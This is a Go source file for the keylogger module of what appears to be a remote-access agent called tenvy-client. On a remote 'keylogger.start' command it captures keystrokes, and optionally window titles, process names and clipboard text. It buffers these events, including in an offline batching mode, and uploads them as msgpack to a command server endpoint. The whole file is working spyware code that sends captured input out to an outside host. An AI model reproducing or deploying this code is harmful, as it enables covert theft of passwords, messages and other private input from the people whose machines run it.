package keylogger

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/rootbay/tenvy-client/internal/protocol"
	"github.com/vmihailenco/msgpack/v5"
)

type (
	Command       = protocol.Command
	CommandResult = protocol.CommandResult
)

type Logger interface {
	Printf(format string, args ...interface{})
}

type HTTPDoer interface {
	Do(req *http.Request) (*http.Response, error)
}

type Config struct {
	AgentID   string
	BaseURL   string
	AuthKey   string
	Client    HTTPDoer
	Logger    Logger
	UserAgent string
}

const (
	requestTimeout    = 10 * time.Second
	defaultCadence    = 250 * time.Millisecond
	defaultBufferSize = 300
	offlineBufferSize = 5000
	offlineInterval   = 15 * time.Minute
	maxBatchEvents    = 2000
)

var (
	controlCharPattern = regexp.MustCompile(`[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]`)
	secretPattern      = regexp.MustCompile(`(?i)(password|secret|token|apikey|auth|bearer)[^\s]+`)
	digitPattern       = regexp.MustCompile(`\b\d{4,}\b`)
)

type session struct {
	id            string
	config        StartConfig
	ctx           context.Context
	cancel        context.CancelFunc
	stream        EventStream
	buffer        []Event
	mu            sync.Mutex
	sequence      uint64
	total         uint64
	cadence       time.Duration
	flushInterval time.Duration
	bufferSize    int
	done          chan struct{}
	lastFlush     time.Time
}

type Manager struct {
	cfg             atomic.Value // Config
	mu              sync.Mutex
	session         *session
	providerFactory func() Provider
}

func NewManager(cfg Config) *Manager {
	m := &Manager{providerFactory: defaultProviderFactory()}
	m.cfg.Store(cfg)
	return m
}

func (m *Manager) UpdateConfig(cfg Config) {
	if m == nil {
		return
	}
	m.cfg.Store(cfg)
}

func (m *Manager) SetProviderFactory(factory func() Provider) {
	if m == nil || factory == nil {
		return
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	m.providerFactory = factory
}

func (m *Manager) config() Config {
	if value := m.cfg.Load(); value != nil {
		if cfg, ok := value.(Config); ok {
			return cfg
		}
	}
	return Config{}
}

func (m *Manager) logf(format string, args ...interface{}) {
	cfg := m.config()
	if cfg.Logger == nil {
		return
	}
	cfg.Logger.Printf(format, args...)
}

func (m *Manager) userAgent() string {
	ua := strings.TrimSpace(m.config().UserAgent)
	if ua != "" {
		return ua
	}
	return "tenvy-client"
}

func (m *Manager) Shutdown(context.Context) {
	m.stopActiveSession("")
}

func (m *Manager) HandleCommand(ctx context.Context, cmd Command) CommandResult {
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	result := CommandResult{CommandID: cmd.ID, CompletedAt: completedAt}

	var payload CommandPayload
	if len(cmd.Payload) > 0 {
		if err := json.Unmarshal(cmd.Payload, &payload); err != nil {
			result.Success = false
			result.Error = fmt.Sprintf("invalid keylogger payload: %v", err)
			return result
		}
	}

	if strings.TrimSpace(payload.Action) == "" {
		switch strings.ToLower(strings.TrimSpace(cmd.Name)) {
		case "keylogger.start":
			payload.Action = "start"
		case "keylogger.stop":
			payload.Action = "stop"
		}
	}

	action := strings.TrimSpace(strings.ToLower(payload.Action))
	switch action {
	case "start":
		config := StartConfig{Mode: payload.Mode}
		if payload.Config != nil {
			config = *payload.Config
			if payload.Mode != "" {
				config.Mode = payload.Mode
			}
		}
		normalized := m.normalizeConfig(config)
		sessionID := strings.TrimSpace(payload.SessionID)
		if sessionID == "" {
			sessionID = generateSessionID()
		}
		if err := m.startSession(sessionID, normalized); err != nil {
			result.Success = false
			result.Error = err.Error()
			return result
		}
		result.Success = true
		result.Output = fmt.Sprintf("session %s", sessionID)
		return result
	case "stop":
		if err := m.stopActiveSession(strings.TrimSpace(payload.SessionID)); err != nil {
			result.Success = false
			result.Error = err.Error()
			return result
		}
		result.Success = true
		return result
	default:
		result.Success = false
		if action == "" {
			result.Error = "keylogger action is required"
		} else {
			result.Error = fmt.Sprintf("unsupported keylogger action: %s", action)
		}
		return result
	}
}

func (m *Manager) normalizeConfig(input StartConfig) StartConfig {
	cfg := input.normalize()
	if cfg.CadenceMs <= 0 {
		cfg.CadenceMs = int(defaultCadence / time.Millisecond)
	}
	if cfg.BufferSize <= 0 {
		if cfg.Mode == ModeOffline {
			cfg.BufferSize = offlineBufferSize
		} else {
			cfg.BufferSize = defaultBufferSize
		}
	}
	if cfg.Mode == ModeOffline && cfg.BatchIntervalMs <= 0 {
		cfg.BatchIntervalMs = int(offlineInterval / time.Millisecond)
	}
	return cfg
}

func (m *Manager) startSession(id string, cfg StartConfig) error {
	m.mu.Lock()
	factory := m.providerFactory
	m.mu.Unlock()

	if factory == nil {
		return errors.New("keylogger capture provider unavailable")
	}

	ctx, cancel := context.WithCancel(context.Background())
	provider := factory()
	if provider == nil {
		cancel()
		return errors.New("keylogger capture provider unavailable")
	}

	stream, err := provider.Start(ctx, cfg)
	if err != nil {
		cancel()
		return fmt.Errorf("failed to start keylogger provider: %w", err)
	}

	session := &session{
		id:         id,
		config:     cfg,
		ctx:        ctx,
		cancel:     cancel,
		stream:     stream,
		buffer:     make([]Event, 0, cfg.BufferSize),
		cadence:    time.Duration(cfg.CadenceMs) * time.Millisecond,
		bufferSize: cfg.BufferSize,
		done:       make(chan struct{}),
	}
	if cfg.Mode == ModeOffline {
		session.flushInterval = time.Duration(cfg.BatchIntervalMs) * time.Millisecond
	}

	m.mu.Lock()
	if existing := m.session; existing != nil {
		m.mu.Unlock()
		m.stopActiveSession("")
		m.mu.Lock()
	}
	m.session = session
	m.mu.Unlock()

	go m.runSession(session)
	return nil
}

func (m *Manager) stopActiveSession(sessionID string) error {
	m.mu.Lock()
	sess := m.session
	if sess == nil {
		m.mu.Unlock()
		return nil
	}
	if sessionID != "" && sessionID != sess.id {
		m.mu.Unlock()
		return fmt.Errorf("keylogger session mismatch: %s", sessionID)
	}
	m.session = nil
	m.mu.Unlock()

	sess.cancel()
	<-sess.done
	return nil
}

func (m *Manager) runSession(sess *session) {
	defer close(sess.done)
	defer func() {
		if sess.stream != nil {
			_ = sess.stream.Close()
		}
	}()

	cadence := sess.cadence
	if cadence <= 0 {
		cadence = defaultCadence
	}

	ticker := time.NewTicker(cadence)
	defer ticker.Stop()

	var offlineTicker *time.Ticker
	var offlineC <-chan time.Time
	if sess.config.Mode == ModeOffline && sess.flushInterval > 0 {
		offlineTicker = time.NewTicker(sess.flushInterval)
		defer offlineTicker.Stop()
		offlineC = offlineTicker.C
	}

	events := sess.stream.Events()
	if events == nil {
		m.logf("keylogger: provider returned nil event channel")
		m.flushSession(sess, true)
		return
	}

	for {
		select {
		case <-sess.ctx.Done():
			m.flushSession(sess, true)
			return
		case event, ok := <-events:
			if !ok {
				m.flushSession(sess, true)
				return
			}
			m.handleCaptureEvent(sess, event)
		case <-ticker.C:
			if sess.config.Mode != ModeOffline {
				m.flushSession(sess, false)
			}
		case <-offlineC:
			if sess.config.Mode == ModeOffline {
				m.flushSession(sess, false)
			}
		}
	}
}

func (m *Manager) handleCaptureEvent(sess *session, capture CaptureEvent) {
	event := m.prepareEvent(sess, capture)

	sess.mu.Lock()
	sess.sequence++
	event.Sequence = sess.sequence
	sess.total++
	sess.buffer = append(sess.buffer, event)
	shouldFlush := len(sess.buffer) >= sess.bufferSize
	if len(sess.buffer) >= maxBatchEvents {
		shouldFlush = true
	}
	sess.mu.Unlock()

	if shouldFlush {
		m.flushSession(sess, false)
	}
}

func (m *Manager) prepareEvent(sess *session, capture CaptureEvent) Event {
	timestamp := capture.Timestamp
	if timestamp.IsZero() {
		timestamp = time.Now().UTC()
	}

	event := Event{
		CapturedAt: timestamp.UTC().Format(time.RFC3339Nano),
		Key:        sanitizeText(strings.TrimSpace(capture.Key)),
		Text:       sanitizeText(capture.Text),
		RawCode:    sanitizeText(capture.RawCode),
		ScanCode:   capture.ScanCode,
		Pressed:    capture.Pressed,
		AltKey:     capture.Alt,
		CtrlKey:    capture.Ctrl,
		ShiftKey:   capture.Shift,
		MetaKey:    capture.Meta,
	}

	if sess.config.IncludeWindowTitle {
		event.WindowTitle = sanitizeText(capture.WindowTitle)
	}
	if sess.config.EmitProcessNames {
		event.ProcessName = sanitizeText(capture.ProcessName)
	}
	if sess.config.IncludeClipboard {
		event.Clipboard = sanitizeText(capture.ClipboardText)
	}

	if sess.config.RedactSecrets {
		event.Text = redactSecrets(event.Text)
		event.Clipboard = redactSecrets(event.Clipboard)
		event.WindowTitle = redactSecrets(event.WindowTitle)
	}

	return event
}

func sanitizeText(value string) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}
	cleaned := controlCharPattern.ReplaceAllString(trimmed, "")
	return strings.TrimSpace(cleaned)
}

func redactSecrets(value string) string {
	if value == "" {
		return value
	}
	result := secretPattern.ReplaceAllString(value, "[redacted]")
	result = digitPattern.ReplaceAllStringFunc(result, func(match string) string {
		if len(match) >= 12 {
			return "[redacted]"
		}
		return match
	})
	return result
}

func (m *Manager) flushSession(sess *session, final bool) {
	sess.mu.Lock()
	if len(sess.buffer) == 0 {
		sess.mu.Unlock()
		return
	}

	events := make([]Event, len(sess.buffer))
	copy(events, sess.buffer)
	batchID := generateBatchID()
	total := sess.total
	sess.buffer = sess.buffer[:0]
	sess.lastFlush = time.Now().UTC()
	sess.mu.Unlock()

	envelope := EventEnvelope{
		SessionID:   sess.id,
		Mode:        sess.config.Mode,
		CapturedAt:  time.Now().UTC().Format(time.RFC3339Nano),
		Events:      events,
		BatchID:     batchID,
		TotalEvents: total,
	}

	if err := m.dispatchEvents(envelope); err != nil {
		m.logf("keylogger: failed to dispatch events: %v", err)
		if !final {
			sess.mu.Lock()
			// Requeue events for retry on next flush.
			sess.buffer = append(envelope.Events, sess.buffer...)
			sess.mu.Unlock()
		}
	}
}

func (m *Manager) dispatchEvents(envelope EventEnvelope) error {
	data, err := msgpack.Marshal(envelope)
	if err != nil {
		return err
	}

	cfg := m.config()
	baseURL := strings.TrimRight(strings.TrimSpace(cfg.BaseURL), "/")
	if baseURL == "" {
		return errors.New("keylogger: missing base URL")
	}
	if cfg.Client == nil {
		return errors.New("keylogger: missing http client")
	}
	agentID := strings.TrimSpace(cfg.AgentID)
	if agentID == "" {
		return errors.New("keylogger: missing agent identifier")
	}

	endpoint := fmt.Sprintf("%s/api/agents/%s/keylogger/events", baseURL, url.PathEscape(agentID))
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/msgpack")
	req.Header.Set("Accept", "application/json")
	if ua := strings.TrimSpace(m.userAgent()); ua != "" {
		req.Header.Set("User-Agent", ua)
	}
	if key := strings.TrimSpace(cfg.AuthKey); key != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", key))
	}

	resp, err := cfg.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		message := fmt.Sprintf("status %d", resp.StatusCode)
		if body, err := io.ReadAll(io.LimitReader(resp.Body, 1024)); err == nil {
			trimmed := strings.TrimSpace(string(body))
			if trimmed != "" {
				message = trimmed
			}
		}
		return fmt.Errorf("keylogger event upload failed: %s", message)
	}
	return nil
}

func generateSessionID() string {
	buf := make([]byte, 12)
	if _, err := rand.Read(buf); err == nil {
		return hex.EncodeToString(buf)
	}
	return fmt.Sprintf("session-%d", time.Now().UnixNano())
}

func generateBatchID() string {
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err == nil {
		return hex.EncodeToString(buf)
	}
	return fmt.Sprintf("batch-%d", time.Now().UnixNano())
}
